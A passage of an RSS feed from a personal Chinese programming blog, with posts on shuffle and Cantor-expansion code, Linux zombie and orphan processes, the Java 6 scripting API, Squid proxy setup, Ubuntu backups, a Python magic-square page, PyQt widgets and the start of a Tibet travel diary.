&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; poker[i]=i;<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k = rand()%(N+1-i)+i; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; swap(poker[i],poker[k]);&nbsp;&nbsp; //交换<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; int i;<br>&nbsp;&nbsp;&nbsp; srand(time(NULL));<br>&nbsp;&nbsp;&nbsp; shuffle();<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;=N;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d ", poker[i]);<br>&nbsp;&nbsp;&nbsp; printf("\n");<br>}<br><br>康托展开源代码(计算排列的编号)：洗牌算法要反过来，即根据排列的编号计算排列的内容。<br>#include &lt;stdio.h&gt;<br><br>int fac[] = {1,1,2,6,24,120,720,5040,40320,362880};<br>unsigned long cantor(int s[], int n) {<br>&nbsp;&nbsp;&nbsp; int i,j,temp,num=0;<br>&nbsp;&nbsp;&nbsp; for(i=1;i&lt;n;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(j=i+1;j&lt;=n;j++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(s[j]&lt;s[i])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num+=fac[n-i]*temp;<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; return num+1;<br>}<br><br>int main(){<br>&nbsp;&nbsp;&nbsp; int x[]={0,1,2,3,5,4};<br>&nbsp;&nbsp;&nbsp; printf("%ld\n", cantor(x,5));<br>&nbsp;&nbsp;&nbsp; int y[]={0,5,4,3,2,1};<br>&nbsp;&nbsp;&nbsp; printf("%ld\n", cantor(y,5));<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109141128016/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux进程：僵尸与孤儿]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010111459588/</link>
      <description>
<![CDATA[一个C++程序，以main函数的return 0退出。真正的运行机制是：<br>gcc 在链接的时候，会在程序的结尾加入sys_exit系统调用。<br>运行时，进程执行sys_exit，发送SIGCHLD信号给父进程，然后，进程进入僵尸状态，变成僵尸进程，等父进程收尸。<br>这样就出来两个问题：<br>1. 如果子进程在执行sys_exit时，父进程已经死亡怎么办？<br>2. 如果子进程退出时，父进程不收尸怎么办？<br>“子存父先死，孙在祖乃丧”，如果父进程在子进程调用sys_exit之前已经死亡，子进程在执行sys_exit时，发的SIGCHLD信号就无人接收了。谁给子进程收尸呢？<br><b>托孤</b><br>答案是“托孤”，武侠小说的主角，往往在要死的时候，将主角托付给一个很牛的人，然后就去了。当一个进程的父进程在这个进程退出前退出的话，就会把这个进程的父进程修改为一个可以“托孤”的很牛的进程，在Linux下，这个进程是PID为1的init进程，每个进程在死亡前，都会把自己的子进程”托孤“给init进程。<br>在Linux0.11内核源代码的linux/kernel/exit.c的do_exit函数中，有这样一段”托孤“的代码：<br>108&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (i=0 ; i&lt;NR_TASKS ; i++) <br>109&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) { <br>110&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; task[i]-&gt;father = 1; <br><b><br>僵尸</b><br>进程在退出后就立刻变成了僵尸，然后等父进程收尸；<br>如果这时它的父进程已经死了，也就是说这个进程是个孤儿，也没问题，它的父进程临死前”托孤“的init进程，也就是它的养父，会帮它收尸。<br>如果这里它的父进程还没死，就要看这个父进程在做什么了？如果这个父进程对正在调用wait或waitpid操作，则表示这个父进程有准备棺材纸钱，这个进程就可以入土为安了。或者这个父进程设置了SIGCHLD信号处理函数，并在处理函数中执行了wait或waitpid操作，也没问题。但如果父进程没有忙得不可开交，没有任何收尸的想法，那这个进程就只好一直处于僵尸态，直到父进程什么时候想起来的时候进行wait或waitpid收尸，或者父进程死的时候收尸。<br>在linux0.11内核源代码linux/kernel/exit.c的do_exit函数中，有这样一段"收尸"的代码<br>111&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (task[i]-&gt;state == TASK_ZOMBIE) <br>112&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* assumption task[1] is always init */<br>113&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void) send_sig(SIGCHLD, task[1], 1); <br>但是，从子进程死亡，到父进程执行wai或死亡的这段时间内，子进程PID和 task_struct 就会一直被占用。<br><br><b>总结：</b><br>孤儿进程，就是子存父先死，进程退出时父进程已经退出，由养父收尸的进程。<br>僵尸进程，就是退出时父进程没有退出，但父进程也没有及时收尸的进程。会耗用一定时间的PID与task_struct资源。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010111459588/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java6的动态语言API]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200833013550333/</link>
      <description>
<![CDATA[/**<br>*Java6原生支持JavaScript，这个例子测试了Java调用脚本（使用脚本引擎和Java类）和脚本调用Java<br>*/<br><br>import javax.script.*;<br><br>public class HelloScriptWorld{<br>&nbsp;&nbsp; &nbsp;public static void main(String args[]) throws ScriptException, NoSuchMethodException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ScriptEngineManager scriptEngineMgr = new ScriptEngineManager();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ScriptEngine jsEngine = scriptEngineMgr.getEngineByName("JavaScript");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (jsEngine == null) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.err.println("No script engine found for JavaScript");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.exit(1);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("Calling invokeHelloScript...");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;invokeHelloScript(jsEngine);<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("\nCalling defineScriptFunction...");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;defineScriptFunction(jsEngine);<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("\nCalling invokeScriptFunctionFromEngine...");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;invokeScriptFunctionFromEngine(jsEngine);<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("\nCalling invokeScriptFunctionFromJava...");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;invokeScriptFunctionFromJava(jsEngine);<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("\nCalling invokeJavaFromScriptFunction...");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;invokeJavaFromScriptFunction(jsEngine);<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;private static void invokeHelloScript(ScriptEngine jsEngine) throws ScriptException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;jsEngine.eval("println('Hello from JavaScript')");<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;private static void defineScriptFunction(ScriptEngine engine) throws ScriptException {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// Define a function in the script engine<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;engine.eval(<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"function sayHello(name) {" +<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;" println('Hello, ' + name);" +<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"}"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;);<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;private static void invokeScriptFunctionFromEngine(ScriptEngine engine)throws ScriptException{<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;engine.eval("sayHello('World!')");<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;private static void invokeScriptFunctionFromJava(ScriptEngine engine)throws ScriptException, NoSuchMethodException{<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Invocable invocableEngine = (Invocable) engine;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;invocableEngine.invokeFunction("sayHello", "from Java");<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;private static void invokeJavaFromScriptFunction(ScriptEngine engine)throws ScriptException&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;engine.put("helloScriptWorld", new HelloScriptWorld());<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;engine.eval(<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"println('Invoking getHelloReply method from JavaScript...');" +<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"var msg = helloScriptWorld.getHelloReply('JavaScript');" +<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"println('Java returned: ' + msg)"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;);<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;/** Method invoked from the above script to return a string. */<br>&nbsp;&nbsp; &nbsp;public String getHelloReply(String name) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return "Java method getHelloReply says, 'Hello, " + name + "'";<br>&nbsp;&nbsp; &nbsp;}<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200833013550333/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下架设squid代理服务器]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008931104357863/</link>
      <description>
<![CDATA[安装：anapt-get install squidan<br>配置：vi /etc/squid/squid.conf<br>acl lan 192.168.1.0/24<br>acl wan 202.114.15.10<br>host_access lan allow<br>host_access wan allow<br>用户认证配置<br>auth_param basic program /usr/lib/squid/ncsa_auth /etc/squid/passwd<br>acl normal proxy_auth REQUIRED<br><font><font face="Verdana">http_access allow normal<br><br></font></font><font><font face="Verdana">管理代理帐户htpasswd -c /var/squid/etc/password guest</font></font><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008931104357863/</guid>
    </item>
    <item>
      <title>
<![CDATA[从ubuntu灾难想备份]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720099194294669/</link>
      <description>
<![CDATA[Ubuntu系统升级，从8.04升到8.10，很平静，从8.10升到9.10失败<br>然后从8.10升到9.04，遇到一些问题，python2.6和python2.6-minimal互相依赖，对apt-get使用force选项仍然失败，请出google，最后发现是python-chert包的问题，从官方下载一个，安装后继续，最后发现新的内核不能用<br>用旧内核从9.04升到9.10，新内核仍然不能用，而且mysql-server坏掉了，bugzilla3坏掉了，打印机坏掉了，脑壳坏掉了，崩溃ing<br><br>于是，决定重装回8.04的系统，目前为止，尚不知Ubuntu降级的方法，只好重装，考虑到重要数据主要在/var/和/home两个区，很傻很天真的试图不备份，直接升级，于是，大四毕业时重装系统导致整个硬盘60G内容丢失的悲剧重演了。<br><br>安装的过程一切都很顺利，一直到分区结束后，弹出一个对话框，大意是：“你选择了保留/var分区的数据，但是如果该分区上有/boot /root之类文件夹，可能会被删除”<br>立刻纠结了，是继续呢，还是继续呢，迷迷糊糊中就按下了Enter键，然后就看着格盘的进度条狂闪，很心虚的祈祷佛祖保佑。<br><br>安装成功后，打开/var一看，svn和www目录完全消失，系统好了，数据没了，人崩溃了。<br><br>开始疯狂恢复系统<br>svn bugzilla samba printer mysql bbpress dhcpd<br>看看都要备份些什么东西吧<br>samba的配制文件/etc/samba/smb.conf备份了<br>mysql数据/var/lib/mysql完全丢失<br>svn数据/var/svn完全丢失<br>bugzilla因为mysql的数据丢失，一切丢失<br>bbpress因为apache的/var/www丢失，完全丢失<br>打印机恢复的忒简单 sudo apt-get install foo2zjs hpijs; sudo hp-setup <br><br>吃一堑，长一智<br>必须备份的数据<br>/etc<br>/home<br>/var(主要是lib/mysql和svn)<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720099194294669/</guid>
    </item>
    <item>
      <title>
<![CDATA[用python生成二维数组 计算九宫]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009111372417212/</link>
      <description>
<![CDATA[<br>用python生成一个m*n的二维数组，并全部初始化为-1：<br>[[-1 for i in range(n)] for i in range(m)]<br><br>计算九宫格 x宫格<br>#jq.py<br>page='''<br>&lt;form method='get' act<wbr>ion='/jg.py/'&gt;<br>&lt;input teye=text name='n' value=%s&gt;<br>&lt;input type=submit value='Calculate'&gt;<br>&lt;/form&gt;<br>&lt;hr&gt;<br>'''<br>def index(req,n='3'):<br>&nbsp;&nbsp;&nbsp; req.content_type="text/html;charset=utf8"<br>&nbsp;&nbsp;&nbsp; if not n.isdigit():<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % '')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;font color='red'&gt;please input a number&lt;/font&gt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return<br>&nbsp;&nbsp;&nbsp; elif int(n)%2==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % '')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;font color='red'&gt;please specify a odd number&lt;/font&gt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return<br>&nbsp;&nbsp;&nbsp; elif int(n)&gt;50:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % '')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;font color='red'&gt;Please specify a number less then 50&lt;/font&gt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % n)<br>&nbsp;&nbsp;&nbsp; n=int(n)<br>&nbsp;&nbsp;&nbsp; raw=[[-1 for i in range(n*n)] for i in range(n*n)]<br>&nbsp;&nbsp;&nbsp; i,j,v=n-1,n/2,1<br>&nbsp;&nbsp;&nbsp; for x in range(n*n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; raw[i][j]=v<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v+=1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nexti,nextj=(i+1)%n,(j+1)%n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(raw[nexti][nextj]!=-1):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i=(i+n-1)%n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i,j=nexti,nextj<br>&nbsp;&nbsp;&nbsp; req.write("&lt;table border=1&gt;")<br>&nbsp;&nbsp;&nbsp; for i in range(n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;tr&gt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;td&gt;%d&lt;/td&gt;" % raw[i][j])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write("&lt;/tr&gt;")<br>&nbsp;&nbsp;&nbsp; req.write("&lt;/table&gt;")<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009111372417212/</guid>
    </item>
    <item>
      <title>
<![CDATA[红蓝3D的Teddy熊]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720106192339325/</link>
      <description>
<![CDATA[<div>OpenGL 的坐标变换顺序很重要，前几天的红蓝效果虽然有，但总觉得有些不对劲，今天调了一下OpenGL 的坐标变换顺序，瞬间突破了。<br>这个Teddy熊效果自我感觉颇不错：<br><img title="红蓝3D的Teddy熊 - hankjin - 云水居" alt="红蓝3D的Teddy熊 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img319.ph.126.net/CraN8jdTEW-pGLwnu4FKhA==/3827778208288223698.png"></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720106192339325/</guid>
    </item>
    <item>
      <title>
<![CDATA[恐惧源于一知半解]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095623843158/</link>
      <description>
<![CDATA[无知者无畏。因为无知，所以不知道什么是恐怖，什么是敬畏。所谓初生牛犊不怕虎，不是不怕，是因为不知道虎可怕。<br><br>全知者不惧。因为全知，所以看开了，伸首一刀，缩头还是一刀，何必作无谓烦恼；因为全知，所以知道如何应付，犹如闲庭信步，游刃而有余。<br><br>恐惧源于一知半解。明知道灾难会发生，却对解决办法不甚了了，在无奈中等待灾难发生的过程才是恐惧。恐惧的不是灾难本身，而是等待灾难发生的过程。<br><br>系统设计师要有庞大的知识库做背景。在某些情境下，能想到两种解决方案，第一种方案信手拈来，可是too old，没有新意，第二种方案完美但复杂，而且没有掌握。何解？上次很锉的选择了第二种方案，于是就有了这篇文章。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095623843158/</guid>
    </item>
    <item>
      <title>
<![CDATA[代码之美-漂亮代码7原则]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200910912913731/</link>
      <description>
<![CDATA[代码之美中，谈DiffManager的一章提到了漂亮代码的7个原则，自己理解如下：<br>1. 像书本一样。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码应该像文章一样，整齐漂亮<br>2. 功能一致者结构一致。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 功能相似的代码，结构也一致<br>3. 缩进&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 缩进层数不要太多，否则很难理解层次结构<br>4. 打断大块&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将大块的代码分解成小块，人的注意力集中时间有限，大块的代码较难理解<br>5. 注释&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在必要的地方注释，更多的是代码自注释<br>6. 整理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 好比审阅文章，调整函数的顺序等，在C#中使用#region<br>7. 一致&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 团队开发，最好能统一个人的风格<br><br>总结为3+1<br>外观12<br>缩进34<br>注释56<br>+<br>团队7<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200910912913731/</guid>
    </item>
    <item>
      <title>
<![CDATA[用Qt画个QQ抽屉]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091016111243894/</link>
      <description>
<![CDATA[来自《Linux窗口程序设计》的实例6：<br>1. 继承QToolBox<br>2. 向QToolBox添加QGroupBox，每个QGroupBox即是一个分组<br>3. 向QGroupBox添加QToolButton，每个QToolButton即是一个头像<br>注意要有几个图片<br><br>from PyQt4.QtGui imp<wbr>ort *<br>from PyQt4.QtCore imp<wbr>ort *<br><br>class QQ(QToolBox):<br>&nbsp;&nbsp; &nbsp;def __init__(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;QToolBox.__init__(self)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;gp1=QGroupBox()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1=QToolButton()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1.setText('beibei')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1.setIcon(QIcon('bb.jpg'))#图标<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1.setIconSize(QSize(80,80))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1.setAutoRaise(True)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_2=QToolButton()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btn1_2.setText('jingjing')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;layout=QVBoxLayout(gp1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;layout.addWidget(btn1_1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;layout.addWidget(btn1_2)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;gp2=QGroupBox()<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.addItem(gp1,'friends')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.addItem(gp2,'news')<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.show()<br>&nbsp;&nbsp; &nbsp;def slogQQ(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pass<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br><br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;app=QApplication([])<br>&nbsp;&nbsp; &nbsp;dlg=QQ()<br>&nbsp;&nbsp; &nbsp;app.setActiveWindow(dlg)<br>&nbsp;&nbsp; &nbsp;app.exec_()<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091016111243894/</guid>
    </item>
    <item>
      <title>
<![CDATA[西藏行，写在前面]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720123281233309/</link>
      <description>
<![CDATA[2011年，安排五一计划的时候，想到了西藏，面对4月正式入职的状况，顺理成章地把计划延迟，定为2012年的五一，并开始了不经意的准备。<div><br></div><div>第一个准备的是人，阿木是第一个入伙的，大雄是第二个入伙并退伙的，der是一直吵着要加班最后第二个加入的，羽是一个电话爽快定下来的，最终成行舍友四人。I have a dream, 不只我们四个，可是由于种种原因，最终是4个，有一点小遗憾，也许四人组是最好的。</div><div><br></div><div>第二个准备的是行程，一直委托给der去安排，可惜der就职于某知名加班公司，五一前1个月，查了五一的放假安排，定了时间8天；搜了两篇游记，定了一个Draft行程。</div><div>&nbsp; &nbsp; 然后开始订票，因为听说飞机去容易高反，所以提前10天订火车票，然后发现我不知道其它三个人的身份证号，并且提前10天8:00网上订票只有座票，后来才发现7:00开始电话订票；幸运的是大家都有一点2，所以决定买座票，<span style="line-height: 22px;"  >上车后再</span>补卧铺。der和羽无私从武汉、杭州赶到北京，一同出发，致敬。</div><div>&nbsp; &nbsp; 然后开始订返程，原计划火车，后来改了飞机。拉萨飞杭州，在杭州玩儿一天，再各飞北京、武汉、杭州。网上查的拉萨飞杭州900，犹豫了一天就变1100了，又等了一晚，果断以1100下手了，现在960。</div><div>&nbsp; &nbsp; 最终参考了一个论坛的5天行程，裁剪成3天的，然后决定用5天走这3天的行程。不催则不悲，不悲催。</div><div><font style="FONT-SIZE: 16pt; FONT-FAMILY: '微软雅黑','MS Sans Serif',sans-serif;"  color="#000000"  